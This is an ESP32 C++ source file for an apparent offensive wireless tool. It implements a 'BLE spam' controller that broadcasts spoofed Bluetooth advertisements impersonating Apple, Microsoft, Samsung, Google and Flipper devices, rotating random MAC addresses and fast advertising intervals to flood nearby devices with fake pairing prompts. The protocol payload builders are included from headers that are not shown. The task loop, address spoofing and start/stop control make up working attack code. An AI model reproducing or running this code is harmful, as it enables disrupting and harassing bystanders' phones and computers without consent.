#include "ble_manager.h"
#include "lib/core/nvs_util.h"
#include <atomic>
#include <cstdint>
#include <cstring>

#include "esp_random.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"

#include "lib/module/ble/ios.h"
#include "lib/module/ble/samsung.h"
#include "lib/module/ble/andriod.h"
#include "lib/module/ble/window.h"

static const char* TAG = "==== ble_ctrl ==== \n";

namespace {

constexpr int NIMBLE_STACK_SIZE = 6144;
constexpr int LOG_INTERVAL_MS = 5000;

std::atomic<bool> initialized{false};
std::atomic<bool> stack_ready{false};
std::atomic<bool> spam_running{false};

core::spam_type type_list[8] = { core::spam_type::apple };
size_t type_count = 1;
volatile uint32_t adv_count = 0;
volatile uint32_t list_idx = 0;

TaskHandle_t nimble_task = nullptr;
SemaphoreHandle_t nimble_exit_sem = nullptr;

TaskHandle_t spam_task = nullptr;
SemaphoreHandle_t spam_exit_sem = nullptr;
esp_timer_handle_t log_timer = nullptr;

const char* type_name(core::spam_type t) {
    switch (t) {
        case core::spam_type::microsoft: return "Microsoft";
        case core::spam_type::apple: return "Apple";
        case core::spam_type::samsung: return "Samsung";
        case core::spam_type::google: return "Google";
        case core::spam_type::flipper_zero: return "Flipper";
        case core::spam_type::all_sequential: return "All(Seq)";
        case core::spam_type::random: return "Random";
        default: return "Unknown";
    }
}

void random_mac(uint8_t* mac) {
    esp_fill_random(mac, 6);
    mac[5] |= 0xC0;
    if ((mac[0] | mac[1] | mac[2] | mac[3] | mac[4]) == 0) mac[0] = 0x01;
}

void on_sync() {
    stack_ready = true;
    ESP_LOGI(TAG, "BLE host synced");
}

void on_reset(int reason) {
    stack_ready = false;
    ESP_LOGW(TAG, "BLE host reset, reason=%d", reason);
}

void nimble_host_fn(void*) {
    nimble_port_run();
    if (nimble_exit_sem) xSemaphoreGive(nimble_exit_sem);
    vTaskDelete(nullptr);
}

bool wait_stack_ready() {
    for (int i = 0; i < 50 && !stack_ready; i++)
        vTaskDelay(pdMS_TO_TICKS(100));
    return stack_ready.load();
}

void log_timer_cb(void*) {
    ESP_LOGI(TAG, "BLE Spam (%s): %lu packets",
             type_name(type_list[list_idx % type_count]), (unsigned long)adv_count);
}

void spam_task_fn(void*) {
    while (spam_running) {
        if (ble_gap_adv_active()) {
            ble_gap_adv_stop();
            vTaskDelay(pdMS_TO_TICKS(20));
        }

        core::spam_type cur_type = type_list[list_idx % type_count];
        bool is_apple = (cur_type == core::spam_type::apple);

        if (!is_apple) {
            uint8_t addr[6];
            random_mac(addr);
            ble_hs_id_set_rnd(addr);
        }

        vTaskDelay(pdMS_TO_TICKS(10));

        uint8_t adv_data[31];
        size_t adv_len = 0;
        bool need_flags = !is_apple;

        if (need_flags) {
            adv_data[0] = 0x02;
            adv_data[1] = 0x01;
            adv_data[2] = 0x1A;
            adv_len = 3;
        }

        uint8_t proto_buf[31];
        size_t proto_len = 0;

        switch (cur_type) {
            case core::spam_type::apple:
                proto_len = module::ios::build_adv(adv_data);
                adv_len   = proto_len;
                break;
            case core::spam_type::microsoft:
                proto_len = module::window::build_adv(proto_buf);
                break;
            case core::spam_type::samsung:
                proto_len = module::samsung::build_adv(proto_buf);
                break;
            case core::spam_type::google:
            case core::spam_type::flipper_zero:
                proto_len = module::andriod::build_adv(proto_buf);
                break;
            case core::spam_type::all_sequential: {
                switch (adv_count % 4) {
                    case 0: proto_len = module::window::build_adv(proto_buf); break;
                    case 1:
                        proto_len  = module::ios::build_adv(adv_data);
                        adv_len    = proto_len;
                        need_flags = false;
                        break;
                    case 2: proto_len = module::samsung::build_adv(proto_buf); break;
                    case 3: proto_len = module::andriod::build_adv(proto_buf); break;
                }
                break;
            }
            case core::spam_type::random: {
                switch (esp_random() % 4) {
                    case 0:
                        proto_len = module::window::build_adv(proto_buf);
                        break;
                    case 1:
                        proto_len  = module::ios::build_adv(adv_data);
                        adv_len    = proto_len;
                        need_flags = false;
                        break;
                    case 2:
                        proto_len = module::samsung::build_adv(proto_buf);
                        break;
                    case 3:
                        proto_len = module::andriod::build_adv(proto_buf);
                        break;
                }
                break;
            }
        }

        if (need_flags && proto_len > 0 && adv_len + proto_len <= 31) {
            memcpy(&adv_data[adv_len], proto_buf, proto_len);
            adv_len += proto_len;
        }

        if (adv_len == 0) {
            vTaskDelay(pdMS_TO_TICKS(20));
            continue;
        }

        int rc = ble_gap_adv_set_data(adv_data, adv_len);
        if (rc != 0) {
            ESP_LOGE(TAG, "adv_set_data failed: %d", rc);
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        ble_gap_adv_params adv_params{};
        adv_params.conn_mode = BLE_GAP_CONN_MODE_NON;
        adv_params.disc_mode = is_apple ? BLE_GAP_DISC_MODE_GEN : BLE_GAP_DISC_MODE_NON;

        if (is_apple) {
            adv_params.itvl_min = 0x30;
            adv_params.itvl_max = 0x40;
        } else {
            adv_params.itvl_min = 0x20;
            adv_params.itvl_max = 0x28;
        }

        uint8_t own_addr = is_apple ? BLE_OWN_ADDR_PUBLIC : BLE_OWN_ADDR_RANDOM;
        int32_t adv_ms = is_apple ? 200 : static_cast<int32_t>((esp_random() % 50) + 50);

        rc = ble_gap_adv_start(own_addr, nullptr, adv_ms, &adv_params, nullptr, nullptr);
        if (rc != 0) {
            ESP_LOGE(TAG, "adv_start failed: %d", rc);
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        adv_count++;
        list_idx++;
        vTaskDelay(pdMS_TO_TICKS(adv_ms + 20));

        if (ble_gap_adv_active()) ble_gap_adv_stop();

        uint32_t idle = is_apple ? 15 : 20;
        vTaskDelay(pdMS_TO_TICKS(idle));
    }

    if (initialized && ble_gap_adv_active()) ble_gap_adv_stop();
    if (spam_task == xTaskGetCurrentTaskHandle()) spam_task = nullptr;
    if (spam_exit_sem) xSemaphoreGive(spam_exit_sem);
    vTaskDelete(nullptr);
}

} 

[[nodiscard]] core::ble_ctrl& core::ble_ctrl::instance() {
    static ble_ctrl inst;
    return inst;
}

core::ble_ctrl::ble_ctrl() {
    core::ensure_nvs_init();
    ESP_LOGI(TAG, "initializing NimBLE stack");

    int ret = nimble_port_init();
    if (ret != 0) {
        ESP_LOGE(TAG, "nimble_port_init failed: %d", ret);
        return;
    }

    ble_hs_cfg.sync_cb = on_sync;
    ble_hs_cfg.reset_cb = on_reset;

    if (!nimble_exit_sem)
        nimble_exit_sem = xSemaphoreCreateBinary();

    xTaskCreate(nimble_host_fn, "nimble_host", NIMBLE_STACK_SIZE,
                nullptr, 5, &nimble_task);

    vTaskDelay(pdMS_TO_TICKS(100));

    initialized = true;
    ESP_LOGI(TAG, "NimBLE stack initialized");
}

core::ble_ctrl::~ble_ctrl() {
    deinit();
}

[[nodiscard]] bool core::ble_ctrl::get_init_status() const { return initialized.load(); }
[[nodiscard]] bool core::ble_ctrl::get_ble_ready() const { return stack_ready.load(); }
[[nodiscard]] bool core::ble_ctrl::get_spam_status() const { return spam_running.load(); }

void core::ble_ctrl::deinit() {
    if (!initialized) return;

    spam_stop();
    stack_ready = false;

    if (ble_gap_adv_active()) ble_gap_adv_stop();

    nimble_port_stop();
    if (nimble_task && nimble_exit_sem) xSemaphoreTake(nimble_exit_sem, pdMS_TO_TICKS(2000));

    vTaskDelay(pdMS_TO_TICKS(50));
    nimble_port_deinit();
    nimble_task = nullptr;

    initialized = false;
    ESP_LOGI(TAG, "NimBLE stack deinitialized");
}

void core::ble_ctrl::spam_start(std::initializer_list<spam_type> types) {
    if (spam_running) spam_stop();

    if (!wait_stack_ready()) {
        ESP_LOGE(TAG, "BLE not ready for spam");
        return;
    }

    type_count = 0;
    for (auto t : types) {
        if (type_count >= 8) break;
        type_list[type_count++] = t;
    }
    if (type_count == 0) return;

    adv_count = 0;
    list_idx = 0;
    spam_running = true;

    if (!spam_exit_sem) spam_exit_sem = xSemaphoreCreateBinary();
    if (spam_exit_sem) xSemaphoreTake(spam_exit_sem, 0);

    if (xTaskCreate(spam_task_fn, "ble_spam", 4096, nullptr, 5, &spam_task) != pdPASS) {
        ESP_LOGE(TAG, "failed to create spam task");
        spam_running = false;
        spam_task = nullptr;
        return;
    }

    if (!log_timer) {
        esp_timer_create_args_t args{};
        args.callback = log_timer_cb;
        args.name = "spam_log";
        esp_timer_create(&args, &log_timer);
    }
    if (log_timer) esp_timer_start_periodic(log_timer,static_cast<uint64_t>(LOG_INTERVAL_MS) * 1000);

    if (type_count == 1) ESP_LOGI(TAG, "BLE Spam started (%s)", type_name(type_list[0]));
    else ESP_LOGI(TAG, "BLE Spam started (%zu types)", type_count);
}
// overload
void core::ble_ctrl::spam_start(spam_type type) {
    spam_start({type});
}

void core::ble_ctrl::spam_stop() {
    bool had_task = (spam_task != nullptr);
    if (!spam_running && !had_task) return;

    spam_running = false;

    if (log_timer) esp_timer_stop(log_timer);

    if (initialized.load() && ble_gap_adv_active()) ble_gap_adv_stop();

    if (had_task) {
        bool exited = false;
        if (spam_exit_sem) exited = (xSemaphoreTake(spam_exit_sem, pdMS_TO_TICKS(750)) == pdTRUE);
        else vTaskDelay(pdMS_TO_TICKS(100));

        if (!exited && spam_task && eTaskGetState(spam_task) != eDeleted) {
            ESP_LOGW(TAG, "spam task exit timed out, forcing");
            vTaskDelete(spam_task);
            spam_task = nullptr;
        }
    }

    ESP_LOGI(TAG, "BLE Spam stopped");
}
